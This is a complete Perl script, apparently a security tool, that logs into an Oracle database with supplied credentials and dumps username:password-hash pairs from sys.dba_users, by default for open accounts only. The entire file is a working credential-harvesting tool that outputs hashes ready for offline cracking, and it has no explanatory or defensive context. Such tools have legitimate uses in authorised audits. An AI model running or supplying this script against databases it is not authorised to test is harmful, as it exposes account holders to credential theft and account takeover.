#!/usr/bin/perl
#
# [get_oracle_hash.pl] 
#
# Retrieve "opened" username:hash from Oracle database.
#
# Author: bunker - http://www.purificato.org
#
use warnings;
use strict;
use DBI;
use DBD::Oracle;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> [-P <port>] [-a|-S]

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 
    
    [-P     <port>     Oracle port]
    [-a                all users, not only "OPEN"]
    [-S                print account status]

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:P:aS';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

my $sqlcmd = 'SELECT username,password,account_status FROM sys.dba_users';
$dbh->{RaiseError} = 1;

my $sth = $dbh->prepare( $sqlcmd );
$sth->execute;

my ( $user, $hash, $status );
$sth->bind_columns( \$user, \$hash, \$status );

while( $sth->fetch() ) {
    if ($opt{a}) {
	if ($opt{S}) { 
	    print "$user:$hash [$status]\n"; 
	}
	else {
	    print "$user:$hash\n";	
	}
    }
    else {
	if ($opt{S}) { 
	    print "$user:$hash [$status]\n" if ($status eq "OPEN"); 
	}
	else {
	    print "$user:$hash\n" if ($status eq "OPEN");	
	}
    }
}

$sth->finish();
$dbh->disconnect();
exit;
